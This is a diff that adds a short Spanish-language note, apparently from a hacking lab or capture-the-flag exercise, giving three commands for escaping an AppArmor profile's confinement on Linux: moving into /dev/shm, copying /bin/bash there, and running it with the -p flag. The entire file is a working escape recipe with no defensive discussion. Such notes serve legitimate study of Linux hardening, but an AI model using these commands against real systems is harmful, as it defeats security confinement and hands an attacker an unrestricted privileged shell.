@@ -1,0 +1,15 @@
+Paso 1: entramos a la ruta sin restricciones 
+
+cd /dev/shm
+
+
+
+Paso 2: copiamos el binario de bash y lo pegamos en la ruta actual
+
+cp /bin/bash .
+
+
+
+Paso 3: lo ejecutamos para escapar del confinamiento del perfil de AppArmor 
+
+./bash -p
